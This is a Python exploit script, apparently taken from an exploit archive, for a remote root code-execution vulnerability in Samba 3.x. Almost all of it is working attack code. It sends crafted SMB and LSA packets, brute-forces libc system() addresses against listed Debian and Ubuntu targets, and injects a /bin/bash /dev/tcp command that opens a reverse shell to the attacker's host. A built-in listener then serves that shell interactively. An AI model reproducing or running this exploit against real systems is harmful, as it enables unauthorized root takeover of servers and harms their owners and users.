#source: https://www.securityfocus.com/bid/55655/info

#Samba is prone to an unspecified remote code-execution vulnerability.

#An attacker can exploit this issue to execute arbitrary code with root privileges. Failed exploit attempts will cause a denial-of-service condition.

#!/usr/bin/python
#
# finding targets 4 31337z:
# gdb /usr/sbin/smbd `ps auwx | grep smbd | grep -v grep | head -n1 | awk '{ print $2 }'` <<< `echo -e "print system"` | grep '$1'
#    -> to get system_libc_addr, enter this value in the 'system_libc_offset' value of the target_finder, run, sit back, wait for shell
# found by eax samba 0day godz (loljk)


from binascii import hexlify, unhexlify
import socket
import threading
import SocketServer
import sys
import os
import time
import struct

targets = [
	{
		"name"               : "samba_3.6.3-debian6",
		"chunk_offset"       : 0x9148,
		"system_libc_offset" : 0xb6d003c0
	},
	{
		"name"               : "samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)",
		"chunk_offset"       : 4560,
		"system_libc_offset" : 0xb20
	},
	{
		"name"               : "target_finder (hardcode correct system addr)",
		"chunk_offset"       : 0,
		"system_libc_offset" : 0xb6d1a3c0,
		"finder": True
	}
]

do_brute = True
rs = 1024
FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

def dump(src, length=32):
	result=[]
	for i in xrange(0, len(src), length):
		s = src[i:i+length]
		hexa = ' '.join(["%02x"%ord(x) for x in s])
		printable = s.translate(FILTER)
		result.append("%04x   %-*s   %s\n" % (i, length*3, hexa, printable))
	return ''.join(result)


sploitshake = [
	# HELLO
	"8100004420434b4644454e4543464445" + \
	"46464346474546464343414341434143" + \
	"41434143410020454745424644464545" + \
	"43455046494341434143414341434143" + \
	"4143414341414100",

	# NTLM_NEGOT
	"0000002fff534d427200000000000000" + \
	"00000000000000000000000000001d14" + \
	"00000000000c00024e54204c4d20302e" + \
	"313200",

	# SESSION_SETUP
	"0000004bff534d427300000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"000000000dff000000ffff02001d1499" + \
	"1f00000000000000000000010000000e" + \
	"000000706f736978007079736d6200",

	# TREE_CONNECT
	"00000044ff534d427500000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"6400000004ff00000000000100190000" + \
	"5c5c2a534d425345525645525c495043" + \
	"24003f3f3f3f3f00",

	# NT_CREATE
	"00000059ff534d42a200000000180100" + \
	"00000000000000000000000001001d14" + \
	"6400000018ff00000000050016000000" + \
	"000000009f0102000000000000000000" + \
	"00000000030000000100000040000000" + \
	"020000000306005c73616d7200"
]

pwnsauce = {
	'smb_bind': \
		"00000092ff534d422500000000000100" + \
		"00000000000000000000000001001d14" + \
		"6400000010000048000004e0ff000000" + \
		"0000000000000000004a0048004a0002" + \
		"002600babe4f005c504950455c000500" + \
		"0b03100000004800000001000000b810" + \
		"b8100000000001000000000001007857" + \
		"34123412cdabef000123456789ab0000" + \
		"0000045d888aeb1cc9119fe808002b10" + \
		"486002000000",

	'data_chunk': \
		"000010efff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"0000000800b0100000b0103f00000000" + \
		"00b0100500000110000000b010000001" + \
		"0000009810000000000800",

	'final_chunk': \
		"000009a3ff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"00000008006409000064093f00000000" + \
		"00640905000002100000006409000001" + \
		"0000004c09000000000800"
}


def exploit(host, port, cbhost, cbport, target):
	global sploitshake, pwnsauce

	chunk_size = 4248

	target_tcp = (host, port)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(target_tcp)

	n = 0
	for pkt in sploitshake:
		s.send(unhexlify(pkt))
		pkt_res = s.recv(rs)
		n = n+1

	fid = hexlify(pkt_res[0x2a] + pkt_res[0x2b])

	s.send(unhexlify(pwnsauce['smb_bind'].replace("babe", fid)))
	pkt_res = s.recv(rs)

	buf = "X"*20  # policy handle
	level = 2 #LSA_POLICY_INFO_AUDIT_EVENTS
	buf+=struct.pack('<H',level) # level
	buf+=struct.pack('<H',level)# level2
	buf+=struct.pack('<L',1)#auditing_mode
	buf+=struct.pack('<L',1)#ptr
	buf+=struct.pack('<L',100000) # r->count
	buf+=struct.pack('<L',20) # array_size
	buf+=struct.pack('<L',0)
	buf+=struct.pack('<L',100)

	buf += ("A" * target['chunk_offset'])

	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0xe8150c70);
	buf+="AAAABBBB"

	cmd = ";;;;/bin/bash -c '/bin/bash 0</dev/tcp/"+cbhost+"/"+cbport+" 1>&0 2>&0' &\x00"

	tmp = cmd*(816/len(cmd))
	tmp += "\x00"*(816-len(tmp))

	buf+=tmp
	buf+="A"*(37192-target['chunk_offset'])
	buf+='z'*(100000 - (28000 + 10000))

	buf_chunks = [buf[x:x+chunk_size] for x in xrange(0, len(buf), chunk_size)]
	n=0

	for chunk in buf_chunks:
		if len(chunk) != chunk_size:
			#print "LAST CHUNK #%d" % n
			bb = unhexlify(pwnsauce['final_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
		else:
			#print "CHUNK #%d" % n
			bb = unhexlify(pwnsauce['data_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
			retbuf = s.recv(rs)
		n=n+1

	s.close()

class connectback_shell(SocketServer.BaseRequestHandler):
	def handle(self):
		global do_brute

		print "\n[!] connectback shell from %s" % self.client_address[0]
		do_brute = False

		s = self.request

		import termios, tty, select, os
		old_settings = termios.tcgetattr(0)
		try:
			tty.setcbreak(0)
			c = True
			while c:
				for i in select.select([0, s.fileno()], [], [], 0)[0]:
					c = os.read(i, 1024)
					if c:
						if i == 0:
							os.write(1, c)

						os.write(s.fileno() if i == 0 else 1, c)
		except KeyboardInterrupt: pass
		finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

		return


class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
	pass


if len(sys.argv) != 6:
	print "\n  {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}\n"
	print "  usage: %s <targethost> <targetport> <myip> <myport> <target>\n" % (sys.argv[0])
	print "  targets:"
	i = 0
	for target in targets:
		print "    %02d) %s" % (i, target['name'])
		i = i+1

	print ""
	sys.exit(-1)


target = targets[int(sys.argv[5])]

server = ThreadedTCPServer((sys.argv[3], int(sys.argv[4])), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()

while do_brute == True:
	sys.stdout.write("\r{+} TRYING EIP=\x1b[31m0x%08x\x1b[0m OFFSET=\x1b[32m0x%08x\x1b[0m" % (target['system_libc_offset'], target['chunk_offset']))
	sys.stdout.flush()
	exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], target)

	if "finder" in target:
		target['chunk_offset'] += 4
	else:
		target['system_libc_offset'] += 0x1000


if "finder" in target:
	print \
		"{!} found \x1b[32mNEW\x1b[0m target: chunk_offset = ~%d, " \
		"system_libc_offset = 0x%03x" % \
		(target['chunk_offset'], target['system_libc_offset'] & 0xff000fff)

while 1:
	time.sleep(999)

server.shutdown()
